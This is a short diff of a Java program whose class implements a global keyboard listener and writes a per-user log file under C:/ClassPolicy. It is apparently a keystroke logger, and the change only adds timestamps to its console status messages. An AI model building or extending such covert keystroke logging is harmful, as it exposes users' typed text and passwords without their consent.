@@ -61,12 +61,12 @@ public class Main implements NativeKeyListener{
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists()) {
 			System.out.println("Creating logfile...");
-			System.out.println("Starting...");
+			System.out.println("[" + robert.elapsedTime() + "] Starting...");
 			log.createNewFile();
 		} else {
-			System.out.println("Starting...");
+			System.out.println("[" + robert.elapsedTime() + "] Starting...");
 		}
-		System.out.println("[" + robert.elapsedTime() + "] File I/O Established.");
+		System.out.println("[" + robert.elapsedTime() + "] [✔] File I/O Established.");
 		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
 		timestamper.println();
